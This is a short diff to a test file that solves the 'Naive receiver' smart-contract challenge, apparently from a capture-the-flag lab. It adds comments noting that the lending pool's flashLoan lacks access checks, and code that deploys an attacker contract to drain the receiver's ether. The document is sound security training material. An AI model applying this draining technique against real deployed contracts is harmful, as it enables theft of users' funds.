@@ -31,6 +31,15 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        // NaiveReceiverLenderPool::flashLoan does not have access limiting modifiers
+        // which allows anyone to drain ether from FlashLoanReceiver contract
+
+        const AttackerFactory = await ethers.getContractFactory("NaiveReceiverAttacker", deployer);
+        this.attacker = await AttackerFactory.deploy();
+
+        await this.attacker.deployed();
+
+        this.attacker.attack(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
